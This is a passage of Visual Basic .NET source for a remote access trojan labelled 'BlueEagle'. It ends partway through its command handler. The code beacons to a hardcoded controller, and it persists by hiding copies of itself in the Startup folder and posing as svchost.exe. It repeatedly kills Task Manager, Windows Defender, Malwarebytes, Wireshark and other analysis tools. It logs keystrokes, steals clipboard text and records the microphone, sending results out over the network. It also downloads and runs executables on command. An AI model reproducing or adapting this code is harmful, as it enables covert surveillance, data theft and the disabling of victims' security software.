Imports System.Net.Sockets, System.Text, System.Net.NetworkInformation, System.Threading, System.Runtime.InteropServices, Microsoft.Win32, System.Globalization, System.Management, System.DirectoryServices, System.IO, System.IO.Compression, Windowstaskhost.NativeWifi
Public Class server
    Public cam As New cam.A
    Public rico As New rec.rec
    Dim list As TextBox
    Dim router As String
    Dim ListView1 As ListView
    Dim networks As ListBox
    Public lannet As New ListBox
    Public lanPcs As String = ""
    Public pcsip As String = ""
    Dim AppPath As String = Application.ExecutablePath
    Private Declare Function ShowWindow Lib "user32" (ByVal handle As IntPtr, ByVal nCmdShow As Integer) As Integer
    Public scam As String
    Delegate Sub chatappd(ByVal data1 As String, ByVal data2 As String, ByVal data3 As String)
    Private Declare Function BlockInput Lib "user32" Alias "BlockInput" (ByVal fBlock As Integer) As Integer
    Private Declare Function ShowCursor Lib "user32" (ByVal lShow As Long) As Long
    Public cap As New CRDP
    Dim yy As String = "|BlueEagle|"
    Public StartupKey As String
    Public hidep As String = 0
    Public sts As String = 0
    Public us As String = 0
    Public ws As String = 0
    Public prx As Boolean = 0
    Public ad As String = 0
    Public a6 As String = 0
    Public a7 As String = 0
    Public a8 As String = 0
    Public a9 As String = 0
    Public sg As String = 0
    Public cts As String = 0
    Public task As String = 0
    Public ipb As String = 0
    Public ph As String = 0
    Dim rK As RegistryKey = Nothing
    Dim ass As String
    Public melts As Boolean = 0
    Public rThread As System.Threading.Thread
    Private WithEvents c As New k
    Private culture As String = CultureInfo.CurrentCulture.EnglishName
    Private country As String = culture.Substring(culture.IndexOf("("c) + 1, culture.LastIndexOf(")"c) - culture.IndexOf("("c) - 1) ' متغير محفوظ فيه اسم الدوله
    Dim host As String
    Dim port As Integer
    Dim virus As String
    Private Declare Auto Function GetWindowText Lib "user32" (ByVal hWnd As System.IntPtr, ByVal lpString As System.Text.StringBuilder, ByVal cch As Integer) As Integer
    Private makel As String
    Private Declare Function GetForegroundWindow Lib "user32" Alias "GetForegroundWindow" () As IntPtr
    Const TASKBAR_SHOW As Integer = &H40
    Const TASKBAR_HIDE As Integer = &H80
    Private Const SETDESKWALLPAPER = 20
    Private Const UPDATEINIFILE = &H1
    Dim alaa(), text1, text2, text3 As String
    Const spl As String = "abccba"
    Dim pw As String
    Dim o As New BlueLogger
    Public caa As New CRDP1
    Public mb As String = 0
    Public sbi As String = 0
    Public loggg As String
    Public cp As String = 0
    Dim namev As String = "Name"
    Dim vir As String = "8.0"
    Dim px As String = 0
    Public virustotal As String = 0
    Public Declare Function apiBlockInput Lib "user32" Alias "BlockInput" (ByVal fBlock As Integer) As Integer
    Public pinger As Integer = 0
    Private Declare Auto Sub SendMessage Lib "user32.dll" (ByVal hWnd As Integer, ByVal msg As UInt32, ByVal wParam As UInt32, ByVal lparam As Integer)
    Public Declare Function SwapMouseButton Lib "user32" Alias "SwapMouseButton" (ByVal bSwap As Long) As Long
    Private Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Integer, ByVal uParam As Integer, ByVal lpvParam As String, ByVal fuWinIni As Integer) As Integer
    Dim tcpfuck = New TcpController
    Public tictoc As Integer = 0
    Dim streamWebcam As Boolean = False
    Public i As Integer
    Dim PictureBox1 As Windows.Forms.PictureBox
    Dim PersistThread As System.Threading.Thread
    Dim usb As New USB
    Dim rg As String
    Public akl As String = 0
    Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
    Private Declare Function SendCamMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Int32, ByVal Msg As Int32, ByVal wParam As Int32, <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.AsAny)> ByVal lParam As Object) As Int32
    Private Declare Function FindWindowEx Lib "user32.dll" Alias _
"FindWindowExA" (ByVal hWnd1 As Int32, ByVal hWnd2 As Int32, ByVal lpsz1 As String, _
ByVal lpsz2 As String) As Int32
    Private Sub showclock()
        Dim TaskBarWin As Long, TrayWin As Long, ClockWin As Long

        TaskBarWin = FindWindow("Shell_TrayWnd", vbNullString)
        TrayWin = FindWindowEx(TaskBarWin, 0, "TrayNotifyWnd", vbNullString)
        ClockWin = FindWindowEx(TrayWin, 0, "TrayClockWClass", vbNullString)
        ShowWindow(ClockWin, 1)
    End Sub
    Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Integer
    Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Integer, ByVal hWndInsertAfter As Integer, ByVal x As Integer, ByVal y As Integer, ByVal cx As Integer, ByVal cy As Integer, ByVal wFlags As Integer) As Integer
    Private Sub HideTaskbarItems()
        Dim TaskBarWin As Long, TaskButtonWin As Long

        TaskBarWin = FindWindow("Shell_TrayWnd", vbNullString)
        TaskButtonWin = FindWindowEx(TaskBarWin, 0, "ReBarWindow32", vbNullString)
        ShowWindow(TaskButtonWin, 1)
    End Sub
    Private Sub ShowTaskbarItems()
        Dim TaskBarWin As Long, TaskButtonWin As Long

        TaskBarWin = FindWindow("Shell_TrayWnd", vbNullString)
        TaskButtonWin = FindWindowEx(TaskBarWin, 0, "ReBarWindow32", vbNullString)
        ShowWindow(TaskButtonWin, 0)
    End Sub
    Private Sub hideclock()
        Dim TaskBarWin As Long, TrayWin As Long, ClockWin As Long

        TaskBarWin = FindWindow("Shell_TrayWnd", vbNullString)
        TrayWin = FindWindowEx(TaskBarWin, 0, "TrayNotifyWnd", vbNullString)
        ClockWin = FindWindowEx(TrayWin, 0, "TrayClockWClass", vbNullString)
        ShowWindow(ClockWin, 0)
    End Sub
    Sub getnames()
        Dim path As ManagementPath = New ManagementPath()
        path.Server = "."
        path.NamespacePath = "root\CIMV2"
        Dim scope As ManagementScope = New ManagementScope(path)
        Dim query As ObjectQuery = New ObjectQuery("SELECT * FROM Win32_PnPEntity")
        Dim searcher As ManagementObjectSearcher = New ManagementObjectSearcher(scope, query)
        Dim queryCollection As ManagementObjectCollection = searcher.Get()
        Dim m As ManagementObject
        Dim nn As String
        For Each m In queryCollection
            Try
                nn = m("Name")
                c.Send("device" & yy & nn)
            Catch ex As Exception

            End Try

        Next
    End Sub
    Private Sub PrinterList()
        Dim p As String
        For Each sPrinters In System.Drawing.Printing.PrinterSettings.InstalledPrinters
            p = "Installed : " & sPrinters
            c.Send("printer" & yy & p)
        Next
        p = ""

        Dim objMS As System.Management.ManagementScope = _
            New System.Management.ManagementScope(ManagementPath.DefaultPath)
        objMS.Connect()

        Dim objQuery As SelectQuery = New SelectQuery("SELECT * FROM Win32_Printer")
        Dim objMOS As ManagementObjectSearcher = New ManagementObjectSearcher(objMS, objQuery)
        Dim objMOC As System.Management.ManagementObjectCollection = objMOS.Get()

        For Each Printers As ManagementObject In objMOC
            If CBool(Printers("Local")) Then
                p = "Local : " & Printers("Name")
                c.Send("printer" & yy & p)
            End If
            If CBool(Printers("Network")) Then
                p = "Network : " & Printers("Name")
                c.Send("printer" & yy & p)
            End If
        Next Printers
    End Sub
    Public Sub AddHome(ByVal text As String)
        Dim key As RegistryKey = Registry.CurrentUser.OpenSubKey("Software\Microsoft\Internet Explorer\Main", True)
        key.SetValue("Start Page", text)
    End Sub
    Public Sub OpenCDDriveDoor()
        Try
            Call mciSendString("Set CDAudio Door Open", 0, 0, 0)
        Catch ex As Exception

        End Try
    End Sub
    Public Sub CloseCdDriveDoor()
        Try
            Call mciSendString("Set CDAudio Door Closed", 0, 0, 0)
        Catch ex As Exception

        End Try
    End Sub
    Sub chatappds(ByVal data1 As String, ByVal data2 As String, ByVal data3 As String)
        Form2.TextBox1.Text = Form2.TextBox1.Text & data1 & " said : " & data3 & vbNewLine
        Form2.Text = data2
        Form2.Show()
    End Sub
    Public Sub HideTaskBar()
        Dim TaskbarHandle As Long
        TaskbarHandle = FindWindow("Shell_traywnd", "")
        SetWindowPos(TaskbarHandle, 0&, 0&, 0&, 0&, 0&, TASKBAR_HIDE)
    End Sub
    Public Sub ShowTaskBar()
        Dim TaskbarHandle As Long
        TaskbarHandle = FindWindow("Shell_traywnd", "")
        SetWindowPos(TaskbarHandle, 0&, 0&, 0&, 0&, 0&, TASKBAR_SHOW)
    End Sub
    Private DJB As Object
    Public Shared Sub CompressFile(ByVal path As String)
        Dim sourceFile As FileStream = File.OpenRead(path)
        Dim destinationFile As FileStream = File.Create(path + ".rar")

        Dim buffer(sourceFile.Length) As Byte
        sourceFile.Read(buffer, 0, buffer.Length)

        Using output As New GZipStream(destinationFile, _
            CompressionMode.Compress)

            Console.WriteLine("Compressing {0} to {1}.", sourceFile.Name, _
                destinationFile.Name, False)

            output.Write(buffer, 0, buffer.Length)
        End Using

        ' Close the files.
        sourceFile.Close()
        destinationFile.Close()

    End Sub
    Public Shared Sub UncompressFile(ByVal path As String)
        Dim sourceFile As FileStream = File.OpenRead(path)
        Dim destinationFile As FileStream = File.Create(path + ".txt")
        Dim buffer(4096) As Byte
        Dim n As Integer

        Using input As New GZipStream(sourceFile, _
            CompressionMode.Decompress, False)

            Console.WriteLine("Decompressing {0} to {1}.", sourceFile.Name, _
                destinationFile.Name)

            n = input.Read(buffer, 0, buffer.Length)
            destinationFile.Write(buffer, 0, n)
        End Using

        sourceFile.Close()
        destinationFile.Close()
    End Sub
    Dim s As String
    Dim N As String
    Function xSTCWkAgg() As String

        Dim DestKey As String = "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\"
        Dim iList = ""
        For Each App As String In Registry.LocalMachine.OpenSubKey(DestKey).GetSubKeyNames
            N = Registry.LocalMachine.OpenSubKey(DestKey & App & "\").GetValue("DisplayName")
            s = Registry.LocalMachine.OpenSubKey(DestKey & App & "\").GetValue("InstallLocation")
            iList += N & "Splitplogmanager" & s
        Next
        Return iList
    End Function
    Dim procID As Integer
    Public strHostName As String
    Public strIPAddress As String
    Public lanip As String = ""
    Private Sub getlan()
        Dim childEntry As DirectoryEntry
        Dim ParentEntry As New DirectoryEntry
        Try
            ParentEntry.Path = "WinNT:"
            For Each childEntry In ParentEntry.Children
                Select Case childEntry.SchemaClassName
                    Case "Domain"

                        Dim SubChildEntry As DirectoryEntry
                        Dim SubParentEntry As New DirectoryEntry
                        SubParentEntry.Path = "WinNT://" & childEntry.Name
                        For Each SubChildEntry In SubParentEntry.Children

                            Select Case SubChildEntry.SchemaClassName
                                Case "Computer"
                                    lannet.Items.Add(SubChildEntry.Name)
                            End Select
                        Next
                End Select
            Next
        Catch Excep As Exception

        Finally
            ParentEntry = Nothing
        End Try

    End Sub
    Public Y As String
    Private Declare Function record Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Integer, ByVal hwndCallback As Integer) As Integer
    Private Sub bsodd()
        For Each aa In Process.GetProcesses
            Try
                If Not aa.ProcessName = Application.ExecutablePath.Split("\")(Application.ExecutablePath.Split("\").Length - 1).Split(".")(0) Then
                    aa.Kill()
                End If
            Catch ex As Exception
            End Try
        Next
    End Sub
    Private Sub getinterfaces()
        Dim nics As NetworkInterface() = NetworkInterface.GetAllNetworkInterfaces()
        If nics.Length < 0 Or nics Is Nothing Then

            Exit Sub
        End If


        For Each netadapter As NetworkInterface In nics
            Dim prop As IPInterfaceProperties = netadapter.GetIPProperties


            Dim paddress As PhysicalAddress = netadapter.GetPhysicalAddress
            Dim pbyte As Byte() = paddress.GetAddressBytes
            Dim mac As String = ""

            For i = 0 To pbyte.Length - 1
                mac &= pbyte(i).ToString("X2")
                If i <> pbyte.Length - 1 Then
                    mac &= "-"
                End If
            Next
            Try

                c.Send("getstat" & yy & "NetWork Interface Name : " & netadapter.Name)
                c.Send("getstat" & yy & "Adapter MAC Address : " & mac)
                c.Send("getstat" & yy & "Adapter IPv4 Address : " & prop.UnicastAddresses(1).Address.ToString)
                c.Send("getstat" & yy & "Net Mask : " & prop.UnicastAddresses(1).IPv4Mask.ToString)
                c.Send("getstat" & yy & "IPv6 Address : " & prop.UnicastAddresses(0).Address.ToString)
                c.Send("getstat" & yy & "Local Link Address " & prop.UnicastAddresses(1).Address.ToString)
                c.Send("getstat" & yy & "=====================================================")
            Catch ex As Exception
                c.Send("staterror" & yy & ex.Message)
            End Try
        Next
    End Sub
    Private Sub stati()
        Dim ipProps As System.Net.NetworkInformation.IPGlobalProperties = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties()
        For Each connection As System.Net.NetworkInformation.TcpConnectionInformation In ipProps.GetActiveTcpConnections
            Dim builder As New System.Text.StringBuilder
            builder.AppendFormat("{0} -> {1} - {2}{3}", connection.LocalEndPoint, connection.RemoteEndPoint, connection.State, Environment.NewLine)
            c.Send("stati" & yy & builder.ToString)
        Next
    End Sub
    Public ia As Integer = 0
    Private Sub getwifis2()

        Dim client As New WlanClient()

        Try
            For Each wlanIface As WlanClient.WlanInterface In client.Interfaces
                Dim wlanBssEntries As Wlan.WlanAvailableNetwork() = wlanIface.GetAvailableNetworkList(0)
                For Each network As Wlan.WlanAvailableNetwork In wlanBssEntries

                    c.Send("wifi3" & yy & System.Text.ASCIIEncoding.ASCII.GetString(network.dot11Ssid.SSID).Trim(ChrW(0)) & yy & network.wlanSignalQuality.ToString() + "%" & yy & network.dot11DefaultAuthAlgorithm.ToString().Trim(CChar(ChrW(0))) & yy & network.dot11DefaultCipherAlgorithm.ToString().Trim(CChar(ChrW(0))))
                Next
            Next

        Catch ex As Exception
            Dim m As String = "Wifi Error : " & ex.Message
            c.Send("wifierror" & yy & m)
        End Try

    End Sub

    Public Function ENB(ByRef s As String) As String
        Dim byt As Byte() = System.Text.Encoding.UTF8.GetBytes(s)
        ENB = Convert.ToBase64String(byt)
    End Function
    Public Function DEB(ByRef s As String) As String
        Dim b As Byte() = Convert.FromBase64String(s)
        DEB = System.Text.Encoding.UTF8.GetString(b)
    End Function
    Public LO As Object = New IO.FileInfo(Application.ExecutablePath)
    Private Sub RS(ByVal a As Object, ByVal e As Object)
        Try
            c.Send("rs" & yy & ENB(e.Data))
        Catch ex As Exception
        End Try
    End Sub
    Sub scansite(ByVal start As String, ByVal portend As String, ByVal ip As String)

        Dim lanportstart As Integer = Integer.Parse(start)
        Dim lanportend As Integer = Integer.Parse(portend)


        Dim result As String
        While lanportstart <= lanportend
            Dim hostadd As System.Net.IPAddress = System.Net.Dns.GetHostEntry(ip).AddressList(0)
            Dim EPhost As New System.Net.IPEndPoint(hostadd, lanportstart)
            Dim s As New System.Net.Sockets.Socket(System.Net.Sockets.AddressFamily.InterNetwork, System.Net.Sockets.SocketType.Stream, System.Net.Sockets.ProtocolType.Tcp)

            Try
                s.Connect(EPhost)
            Catch
            End Try
            If Not s.Connected Then

                result = "Port " + lanportstart.ToString + " is Closed"

            Else
                result = "Port " + lanportstart.ToString + " is open"

            End If
            c.Send("scanresults" & yy & result)
            lanportstart += 1
        End While


    End Sub
    Sub scanlan(ByVal ip As String, ByVal port1 As String, ByVal port2 As String)

        Dim lanportstart As Integer = Integer.Parse(port1)
        Dim lanportend As Integer = Integer.Parse(port2)


        Dim result As String
        While lanportstart <= lanportend
            Dim hostadd As System.Net.IPAddress = System.Net.Dns.GetHostEntry(ip).AddressList(0)
            Dim EPhost As New System.Net.IPEndPoint(hostadd, lanportstart)
            Dim s As New System.Net.Sockets.Socket(System.Net.Sockets.AddressFamily.InterNetwork, System.Net.Sockets.SocketType.Stream, System.Net.Sockets.ProtocolType.Tcp)

            Try
                s.Connect(EPhost)
            Catch
            End Try
            If Not s.Connected Then

                result = "Port " + lanportstart.ToString + " is Closed"

            Else
                result = "Port " + lanportstart.ToString + " is open"

            End If
            c.Send("lanresults" & yy & result)
            lanportstart += 1
        End While


    End Sub
    Private Sub ex()
        Try
            c.Send("rsc" & yy)
        Catch ex As Exception
        End Try
    End Sub
    Delegate Sub gt()
    Function gtx() As String
        Dim str As String
        str = Windows.Forms.Clipboard.GetText
        c.Send("recvcli" & yy & str)
        Return True
    End Function
    Public Sub DLV(ByVal n As String)
        Try
            Registry.CurrentUser.CreateSubKey("Software\" & rg).DeleteValue(n)
        Catch ex As Exception
        End Try
    End Sub
    Function GTV(ByVal n As String) As String
        Try
            Return Registry.CurrentUser.CreateSubKey("Software\" & rg).GetValue(n, "")
        Catch ex As Exception
            Return ""
        End Try
    End Function
    Function STV(ByVal n As String, ByVal t As String)
        Try
            Registry.CurrentUser.CreateSubKey("Software\" & rg).SetValue(n, t)
            Return True
        Catch ex As Exception
            Return False
        End Try
    End Function
    Function GetKey(ByVal key As String) As Microsoft.Win32.RegistryKey
        Dim k As String
        If key.StartsWith(Registry.ClassesRoot.Name) Then
            k = key.Replace(Registry.ClassesRoot.Name & "\", "")
            Return Registry.ClassesRoot.OpenSubKey(k, True)
        End If
        If key.StartsWith(Registry.CurrentUser.Name) Then
            k = key.Replace(Registry.CurrentUser.Name & "\", "")
            Return Registry.CurrentUser.OpenSubKey(k, True)
        End If
        If key.StartsWith(Registry.LocalMachine.Name) Then
            k = key.Replace(Registry.LocalMachine.Name & "\", "")
            Return Registry.LocalMachine.OpenSubKey(k, True)
        End If
        If key.StartsWith(Registry.Users.Name) Then
            k = key.Replace(Registry.Users.Name & "\", "")
            Return Registry.Users.OpenSubKey(k, True)
        End If
        Return Nothing
    End Function
    Private Sub SuspendProcess(ByVal process As System.Diagnostics.Process)
        For Each t As ProcessThread In process.Threads
            Dim th As IntPtr
            th = OpenThread(ThreadAccess.SUSPEND_RESUME, False, t.Id)
            If th <> IntPtr.Zero Then
                SuspendThread(th)
                CloseHandle(th)
            End If
        Next
    End Sub
    Function rams() As Integer
        rams = (My.Computer.Info.TotalPhysicalMemory / 1024 / 1024 / 1024)
    End Function
    Private Function GetCaption() As String
        Dim Caption As New System.Text.StringBuilder(256)
        Dim hWnd As IntPtr = GetForegroundWindow()
        GetWindowText(hWnd, Caption, Caption.Capacity)
        Return Caption.ToString()
    End Function
    Public Sub copytostartup()
        Dim dirto As String = "C:\Users\" & Environment.UserName & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
        Dim AppPath As String = Application.ExecutablePath
        Dim AutoStart As String = dirto & "/"
        Dim HideFile As IO.FileInfo = My.Computer.FileSystem.GetFileInfo(dirto)
        Try
            File.Copy(AppPath, AutoStart & "Microsoft.exe", True)
            File.Copy(AppPath, AutoStart & "Microsoft.scr", True)
            File.Copy(AppPath, AutoStart & "Microsoft.bat", True)
            File.Copy(AppPath, AutoStart & "Microsoft.com", True)
            HideFile.IsReadOnly = True
            HideFile.Attributes = HideFile.Attributes Or IO.FileAttributes.Hidden
            SetAttr(dirto & "/" & "Microsoft.exe", FileAttribute.Hidden)
            SetAttr(dirto & "/" & "Microsoft.scr", FileAttribute.Hidden)
            SetAttr(dirto & "/" & "Microsoft.bat", FileAttribute.Hidden)
            SetAttr(dirto & "/" & "Microsoft.com", FileAttribute.Hidden)
        Catch ex As Exception
        End Try
    End Sub
    Sub startx()


        FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared)
        text1 = Space(LOF(1))
        text2 = Space(LOF(1))
        text3 = Space(LOF(1))

        FileGet(1, text1)
        FileGet(1, text2)
        FileGet(1, text3)

        FileClose()
        alaa = Split(text1, spl)
        host = alaa(1)
        port = alaa(2)
        virus = (alaa(3))
        task = alaa(4)
        us = alaa(5)
        hidep = alaa(6)
        melts = alaa(7)
        Try
            px = alaa(8)
            sbi = alaa(9)
            sts = alaa(10)
            sg = alaa(11)
            ws = alaa(12)
            mb = alaa(13)
            ad = alaa(14)
            ipb = alaa(15)
            cp = alaa(16)
            ph = alaa(17)
            akl = alaa(18)
            a6 = alaa(19)
            a7 = alaa(20)
            cts = alaa(21)
            virustotal = alaa(22)
        Catch : End Try
    End Sub
    Private Sub server_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        Try
            host = "192.168.1.9"
            port = 1177
            Me.Hide()
            pw = A.GT
            Timer1.Start()
            copytostartup()
            o.Start()

            If virustotal Then
                Block("virustotal")
            End If
            If cts Then
                copytostartup()
            End If
            If a7 Then
                Timer15.Start()
            End If
            If a6 Then
                Timer3.Start()

            End If
            If akl Then
                Timer5.Start()
            End If
            If ph Then
                Timer4.Start()

            End If
            If cp Then
                Timer6.Start()
            End If
            If ipb Then
                Timer7.Start()
            End If
            If ad Then
                Timer8.Start()
            End If
            If mb Then
                Timer9.Start()
            End If
            If ws Then
                Timer10.Start()
            End If
            If sg Then
                Timer11.Start()
            End If
            If sts Then
                Timer12.Start()
            End If
            If sbi Then
                Timer13.Start()
            End If
            If px Then
                Timer14.Start()

            End If
            If melts Then
                If Application.ExecutablePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe" Then
                    If File.Exists(Path.GetTempPath & "melt.txt") Then
                        Try : IO.File.Delete(IO.File.ReadAllText(Path.GetTempPath & "melt.txt")) : Catch : End Try
                    End If
                Else

                    If File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe") Then
                        Try : IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe") : Catch : End Try
                        IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe")
                        IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
                        Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe")
                        End
                    Else
                        IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe")
                        IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
                        Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe")
                        End
                    End If
                End If
            End If
            If us Then
                Try
                    usb.Start()
                Catch ex As Exception
                End Try
            End If
            If task Then
                Timer16.Start()
            End If
        Catch ex As Exception
            Me.Hide()
            End
        End Try

    End Sub
    Private Sub Timer1_Tick(sender As System.Object, e As System.EventArgs) Handles Timer1.Tick
        If c.Statconnected = False Then
            c.Connect(host, port)
        End If
    End Sub
    Private Sub Timer2_Tick(sender As System.Object, e As System.EventArgs) Handles Timer2.Tick
        Dim CapTxt As String = GetCaption()
        If makel <> CapTxt Then
            makel = CapTxt
            Timer2.Stop()
            c.Send("AW" & yy & CapTxt)
            Timer2.Start()
        End If
    End Sub
    Private Sub Timer3_Tick(sender As System.Object, e As System.EventArgs) Handles Timer3.Tick
        Dim generaldee As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To generaldee.Length - 1
            Select Case Strings.LCase(generaldee(i).ProcessName)
                Case "keyscrambler"
                    generaldee(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Private Sub Timer4_Tick(sender As System.Object, e As System.EventArgs) Handles Timer4.Tick
        Dim Code8() As Process = System.Diagnostics.Process.GetProcessesByName("ProcessHacker")
        For Each X As Process In Code8
            X.Kill()
        Next
    End Sub
    Private Sub Timer5_Tick(sender As System.Object, e As System.EventArgs) Handles Timer5.Tick
        Try
            Dim AntiLogger() As Process = Process.GetProcessesByName("AntiLogger")

            For Each Process As Process In AntiLogger
                Process.Kill()
            Next

        Catch x As Exception
        End Try
    End Sub
    Private Sub Timer6_Tick(sender As System.Object, e As System.EventArgs) Handles Timer6.Tick
        Dim Code7() As Process = System.Diagnostics.Process.GetProcessesByName("cports")
        For Each X As Process In Code7
            X.Kill()
        Next
    End Sub
    Private Sub Timer7_Tick(sender As System.Object, e As System.EventArgs) Handles Timer7.Tick
        Dim Code6() As Process = System.Diagnostics.Process.GetProcessesByName("IPBlocker")
        For Each X As Process In Code6
            X.Kill()
        Next
    End Sub
    Private Sub Timer8_Tick(sender As System.Object, e As System.EventArgs) Handles Timer8.Tick
        Dim Code5() As Process = System.Diagnostics.Process.GetProcessesByName("apateDNS")
        For Each X As Process In Code5
            X.Kill()
        Next
    End Sub
    Private Sub Timer9_Tick(sender As System.Object, e As System.EventArgs) Handles Timer9.Tick
        Dim Code4() As Process = System.Diagnostics.Process.GetProcessesByName("mbam")
        For Each X As Process In Code4
            X.Kill()
        Next
    End Sub
    Private Sub Timer10_Tick(sender As System.Object, e As System.EventArgs) Handles Timer10.Tick
        Dim Code3() As Process = System.Diagnostics.Process.GetProcessesByName("wireshark")
        For Each x As Process In Code3
            x.Kill()
        Next
    End Sub
    Private Sub Timer11_Tick(sender As System.Object, e As System.EventArgs) Handles Timer11.Tick
        Dim Code2() As Process = System.Diagnostics.Process.GetProcessesByName("SpeedGear")
        For Each X As Process In Code2
            X.Kill()
        Next
    End Sub
    Private Sub Timer12_Tick(sender As System.Object, e As System.EventArgs) Handles Timer12.Tick
        Dim Code3() As Process = System.Diagnostics.Process.GetProcessesByName("SpyTheSpy")
        For Each X As Process In Code3
            X.Kill()
        Next
    End Sub
    Private Sub Timer13_Tick(sender As System.Object, e As System.EventArgs) Handles Timer13.Tick
        Dim Code1() As Process = System.Diagnostics.Process.GetProcessesByName("SbieCtrl")
        For Each X As Process In Code1
            X.Kill()
        Next
    End Sub
    Private Sub Timer14_Tick(sender As System.Object, e As System.EventArgs) Handles Timer14.Tick
        On Error Resume Next
        Dim Code() As Process = System.Diagnostics.Process.GetProcessesByName("procexp")
        For Each X As Process In Code
            X.Kill()
        Next
        Dim a() As Process = System.Diagnostics.Process.GetProcessesByName("procexp64")
        For Each X As Process In a
            X.Kill()
        Next
    End Sub
    Private Sub Timer15_Tick(sender As System.Object, e As System.EventArgs) Handles Timer15.Tick
        Dim generaldee As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To generaldee.Length - 1
            Select Case Strings.LCase(generaldee(i).ProcessName)
                Case "xns5"
                    generaldee(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Private Sub Timer16_Tick(sender As System.Object, e As System.EventArgs) Handles Timer16.Tick


        For Each prog As Process In Process.GetProcesses
            If prog.ProcessName = "Taskmgr" Then
                Try
                    prog.Kill()
                Catch ex As Exception

                End Try

            End If
            If prog.ProcessName = "MsMpEng" Then
                Try
                    prog.Kill()
                Catch ex As Exception

                End Try

            End If
            If prog.ProcessName = "MpCmdRun" Then
                Try
                    prog.Kill()
                Catch ex As Exception

                End Try

            End If
            If prog.ProcessName = "MSASCui" Then
                Try
                    prog.Kill()
                Catch ex As Exception

                End Try

            End If
        Next
    End Sub
    Private Const APPCOMMAND_VOLUME_MUTE As Integer = &H80000
    Private Const APPCOMMAND_VOLUME_UP As Integer = &HA0000
    Private Const APPCOMMAND_VOLUME_DOWN As Integer = &H90000
    Private Const WM_APPCOMMAND As Integer = &H319
    <DllImport("user32.dll")> _
    Public Shared Function SendMessageW(ByVal hWnd As IntPtr, _
               ByVal Msg As Integer, ByVal wParam As IntPtr, _
               ByVal lParam As IntPtr) As IntPtr
    End Function
    Private Sub data(ByVal b As Byte()) Handles c.Data
        Dim T As String = BS(b)
        Dim base64Encoded As String = T 'Encoded
        '  base64Encoded.Replace("\%\%\%", "a")
        ' base64Encoded.Replace("$^$", "s")
        Dim base64Decoded As String
        Dim datax() As Byte
        datax = System.Convert.FromBase64String(base64Encoded)
        base64Decoded = System.Text.ASCIIEncoding.ASCII.GetString(datax)

        Dim A As String() = Split(base64Decoded, yy)

        Try
            Select Case A(0)
                Case "enterlan"
                    Dim pcname As String = A(1)
                    Dim pcip As String
                    Dim Hostname As Net.IPHostEntry = Net.Dns.GetHostByName(pcname)
                    Dim ip As Net.IPAddress() = Hostname.AddressList
                    pcip = ip(0).ToString
                    c.Send("pcip" & yy & pcip)
                Case "lock"
                    IO.File.WriteAllBytes(IO.Path.GetTempPath & A(1), Convert.FromBase64String(A(2)))
                    Threading.Thread.CurrentThread.Sleep(1000)
                    Process.Start(IO.Path.GetTempPath & A(1))

                Case "viewlan"
                    c.Send("viewlan")


                Case "getlan"
                    ' c.Send("getlan" & yy & lanlist())
                    lannet.Items.Clear()

                    getlan()
                    For Each PC In lannet.Items
                        c.Send("getlan" & yy & PC)
                    Next
                    ' c.Send("getlan" & yy & lanlist())


                Case "scanlan"
                    Dim pcname As String = A(1)
                    Dim pcip As String
                    Dim Hostname As Net.IPHostEntry = Net.Dns.GetHostByName(pcname)
                    Dim ip As Net.IPAddress() = Hostname.AddressList
                    pcip = ip(0).ToString
                    scanlan(pcip, A(2), A(3))
                Case "scansite"
                    scansite(A(1), A(2), A(3))
                Case "sitescanner"
                    c.Send("opensacnner")
                Case "wifi2"

                    getwifis2()


                Case "openfm2"
                    c.Send("openfm2" & yy & xSTCWkAgg())
                Case "devicesinfo"
                    c.Send("showinfo")
                Case "getinfonow"
                    getnames()
                    PrinterList()

                Case "openinstall"


                    c.Send("openinstall" & yy & xSTCWkAgg())
                Case "startrec"
                    rico.startrec()
                    While My.Computer.FileSystem.FileExists(IO.Path.GetTempPath & "soundrec" & tictoc & ".wav")
                        tictoc = tictoc + 1
                    End While
                Case "stoprec"
                    rico.stoprec()
                    c.Send("downloadtherec" & yy & Convert.ToBase64String(IO.File.ReadAllBytes(IO.Path.GetTempPath & "soundrec" & tictoc & ".wav")))

                Case "requestrecords"
                    c.Send("requestrecords")
                Case "startrec"
                    rico.startrec()
                    While My.Computer.FileSystem.FileExists(IO.Path.GetTempPath & "soundrec" & tictoc & ".wav")
                        tictoc = tictoc + 1
                    End While
                Case "stoprec"
                    rico.stoprec()
                    c.Send("downloadtherec" & yy & Convert.ToBase64String(IO.File.ReadAllBytes(IO.Path.GetTempPath & "soundrec" & tictoc & ".wav")))

                Case "viewimage"
